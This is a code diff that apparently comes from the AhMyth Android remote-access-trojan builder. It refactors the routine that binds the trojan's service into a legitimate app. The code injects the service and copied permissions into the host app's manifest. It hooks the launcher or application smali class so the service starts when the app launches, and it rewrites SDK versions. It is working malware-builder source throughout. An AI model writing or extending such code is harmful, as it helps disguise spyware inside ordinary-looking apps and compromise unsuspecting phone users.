@@ -32,13 +32,24 @@ var copyPermissions = (manifest) => {
     return (firstPart + lastPart);
 };
 
-//$appCtrl.BindOnLaunch = (apkFolder) => {
-    
-    setTimeout(() => {
-        console.log('[★] Reading the Android Manifest file...\n');
-        fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
+$appCtrl.BindOnLaunch = (apkFolder) => {
+
+
+    delayedLog('[★] Reading the Android Manifest File...\n');
+    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
+        if (error) {
+            delayedLog('[x] Reading the Android Manifest file Failed!\n');
+            return;
+        }
+
+        delayedLog('[★] Modifying the Android Manifest File...\n');
+        const ahmythService = CONSTANTS.ahmythService;
+        const permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);
+        const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService
+        + permManifest.substring(permManifest.indexOf('</application>'));
+        fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {
             if (error) {
-                console.log('[x] Reading the Android Manifest file Failed!\n');
+                delayedLog('[x] Modifying the Android Manifest Failed!\n', error);
                 return;
             }
 
@@ -48,127 +59,123 @@ var copyPermissions = (manifest) => {
                     return;
                 }
 
+                delayedLog('[★] Searching for a Hookable Class in the Android Manifest...\n')
                 const launcherActivity = GetLauncherActivity(result, apkFolder);
                 if (launcherActivity === -1) {
-                    console.log('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');
-                    console.log('[x] Please use Another APK as a Template!.\n');
+                    delayedLog('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');
+                    delayedLog('[x] Please use Another APK as a Template!.\n');
                     return;
                 }
 
-                setTimeout(() => {
-                    console.log('[★] Modifying the Android Manifest File...\n');
-                    const ahmythService = CONSTANTS.ahmythService;
-                    const permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);
-                    const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService
-                    + permManifest.substring(permManifest.indexOf('</application>'));
-                    fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {
+                delayedLog('[★] Locating the Hookable Smali Class File...\n');
+                const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
+                    if (err) {
+                        delayedLog('[x] Unable to Locate the Hookable Smali Class File!');
+                        delayedLog('[x] Please Use the "On Boot" Method!\n');
+                        return;
+                    } else {
+                        delayedLog('[¡] Hookable Smali Class File Found: ' + launcherPath + '\n');
+                    }
+
+
+                    delayedLog('[★] Reading the Hookable Smali Class File...\n');
+                    fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                         if (error) {
-                            console.log('[x] Modifying the Android Manifest Failed!\n', error);
+                            delayedLog('[x] Unable to Read the Hookable Smali Class File!\n');
                             return;
                         }
 
-                        setTimeout(() => {
-                            console.log('[★] Locating the Hookable Main Class File...\n');
-                            const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
-                                if (err) {
-                                    console.log('[x] No Launcher Activity!\n');
+                        const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
+                        var hook = CONSTANTS.hookPoint;
+
+
+                        delayedLog('[★] Hooking the Smali Class File...\n');
+
+                        var output = data.replace(hook, startService);
+                        fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+                            if (error) {
+                                delayedLog('[x] Modifying the Hookable Smali Class File Failed!\n', CONSTANTS.logStatus.FAIL);
+                                return;
+                            }
+
+
+                            delayedLog('[★] Determining Target SDK Version...\n');
+                            fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
+                                if (error) {
+
+                                    delayedLog('[x] Reading the Manifest Target SDK Failed.');
+
                                     return;
-                                } else {
-                                    console.log('[★] Launcher Activity Found: ' + launcherPath + '\n');
                                 }
 
-                                setTimeout(() => {
-                                    console.log('[★] Reading the Hookable Main Class File...\n');
-                                    fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
+
+                                delayedLog('[★] Modifying the Target SDK Version...\n');
+
+
+                                var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
+                                var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
+                                var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+                                var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
+
+                                var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
+                                .replace(compSdkVerNameRegex, "$111" + '"')
+                                .replace(platVerCoRegex, "$122" + '"')
+                                .replace(platVerNameRegex, "$111" + '"');
+
+                                fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
+                                    if (error) {
+
+                                        delayedLog('[x] Modifying Manifest Target SDK Failed!\n', CONSTANTS.logStatus.FAIL);
+
+                                        return;
+                                    }
+
+                                    fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                         if (error) {
-                                            console.log('[x] Unable to Read the Hookable Class File!\n');
+
+                                            delayedLog("[x] Reading the 'apktool.yml' Target SDK Failed!\n");
+
                                             return;
                                         }
 
-                                        const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
-                                        var hook = CONSTANTS.hookPoint;
+                                        var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
+                                        var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
 
-                                        setTimeout(() => {
-                                            console.log('[★] Hooking the Main Class File...\n');
+                                        var repYmlSdk = data.replace(minSdkRegex, "$119'")
+                                        .replace(tarSdkRegex, "$122'");
 
-                                            var output = data.replace(hook, startService);
-                                            fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
-                                                if (error) {
-                                                    console.log('[x] Modifying the Hooked Main Class File Failed!\n', CONSTANTS.logStatus.FAIL);
-                                                    return;
-                                                }
+                                        fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
+                                            if (error) {
 
-                                                setTimeout(() => {
-                                                    console.log('[★] Determining Target SDK Version...\n');
-                                                    fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
-                                                        if (error) {
-                                                            setTimeout(() => {
-                                                                console.log('[x] Reading the Manifest Target SDK Failed.');
-                                                            }, 1000);
-                                                            return;
-                                                        }
+                                                delayedLog("[x] Modifying the 'apktool.yml' Target SDK Failed!\n");
 
-                                                        setTimeout(() => {
-                                                            console.log('[★] Modifying the Target SDK Version...\n');
-                                                        }, 1000);
-
-                                                        var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
-                                                        var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
-                                                        var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
-                                                        var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
-
-                                                        var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
-                                                        .replace(compSdkVerNameRegex, "$111" + '"')
-                                                        .replace(platVerCoRegex, "$122" + '"')
-                                                        .replace(platVerNameRegex, "$111" + '"');
-
-                                                        fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
-                                                            if (error) {
-                                                                setTimeout(() => {
-                                                                    console.log('[x] Modifying Manifest Target SDK Failed!\n', CONSTANTS.logStatus.FAIL);
-                                                                }, 1000);
-                                                                return;
-                                                            }
-
-                                                            fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
-                                                                if (error) {
-                                                                    setTimeout(() => {
-                                                                        console.log("[x] Reading the 'apktool.yml' Target SDK Failed!\n");
-                                                                    }, 1000);
-                                                                    return;
-                                                                }
-
-                                                                var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
-                                                                var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
-
-                                                                var repYmlSdk = data.replace(minSdkRegex, "$119'")
-                                                                .replace(tarSdkRegex, "$122'");
-
-                                                                fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
-                                                                    if (error) {
-                                                                        setTimeout(() => {
-                                                                            console.log("[x] Modifying the 'apktool.yml' Target SDK Failed!\n");
-                                                                        }, 1000);
-                                                                        return;
-                                                                    }
-                                                                    // $appCtrl.copyAhmythFilesAndGenerateApk
-                                                                });
-                                                            });
-                                                        });
-                                                    });
-                                                }, 1000);
-                                            });
-                                        }, 1000);
+                                                return;
+                                            }
+                                            // $appCtrl.copyAhmythFilesAndGenerateApk
+                                        });
                                     });
-                                }, 1000);
+                                });
                             });
-                        }, 1000);
+
+                        });
+
                     });
-                }, 1000);
+
+                });
+
             });
+
         });
-    }, 1000);
-//};
+    });
+
+};
+
+function delayedLog(message) {
+    let count = delayedLog.count = (delayedLog.count || 0) + 1;
+    setTimeout(() => {
+        console.log(message);
+    }, count * 1000);
+};
 
 function GetLauncherActivity(manifest) {
 
@@ -181,7 +188,7 @@ function GetLauncherActivity(manifest) {
         if (mainApplicationClassName.startsWith('.')) {
             mainApplicationClassName = mainApplicationClassName.slice(1);
         }
-        setTimeout(() => console.log('[¡] Scoped the Main App Class for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main App Class for Hooking...\n');
         return mainApplicationClassName + '.smali';
     }
 
@@ -204,7 +211,7 @@ function GetLauncherActivity(manifest) {
         if (mainActivityClassName.startsWith('.')) {
             mainActivityClassName = mainActivityClassName.slice(1);
         }
-        setTimeout(() => console.log('[¡] Scoped the Main Launcher Activity for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main Launcher Activity for Hooking...\n');
         return mainActivityClassName + '.smali';
     }
 
@@ -227,7 +234,7 @@ function GetLauncherActivity(manifest) {
         if (targetActivityName.startsWith('.')) {
             targetActivityName = targetActivityName.slice(1);
         }
-        setTimeout(() => console.log('[¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n');
         return targetActivityName + '.smali';
     }
 
@@ -236,29 +243,36 @@ function GetLauncherActivity(manifest) {
 }
 
 function GetLauncherPath(launcherActivity, apkFolder, callback) {
-  let found = false;
-  let launcherPath = null;
-  readdirp(apkFolder, { fileFilter: launcherActivity, alwaysStat: true })
+    let found = false;
+    let launcherPath = null;
+    readdirp(apkFolder, {
+        fileFilter: launcherActivity, alwaysStat: true
+    })
     .on('data', (entry) => {
-      found = true;
-      var { path, stats: {} } = entry;
-      var output = `${JSON.stringify(path)}`;
-      if (process.platform === 'win32') {
-        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").replace(/\n$/, '');
-      } else {
-        (process.platform === 'linux' || process.platform === 'darwin');
-        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
-      }
+        found = true;
+        var {
+            path, stats: {}
+        } = entry;
+        var output = `${JSON.stringify(path)}`;
+        if (process.platform === 'win32') {
+            launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").replace(/\n$/, '');
+        } else {
+            (process.platform === 'linux' || process.platform === 'darwin');
+            launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
+        }
     })
-    .on('end', () => {
-      if (!found) {
-        callback(`The LauncherActivity was not found in ${apkFolder}`);
-      } else {
-        callback(null, launcherPath);
-      }
-    })
-    .on('error', (err) => {
-      callback(err);
-    });
+    .on('end',
+        () => {
+            if (!found) {
+                callback('[x] Unable to Locate the Hookable Smali Class File!');
+                callback('[x] Please Use the "On Boot" Method!\n');
+            } else {
+                callback(null, launcherPath);
+            }
+        })
+    .on('error',
+        (err) => {
+            callback(err);
+        });
 }
 ```
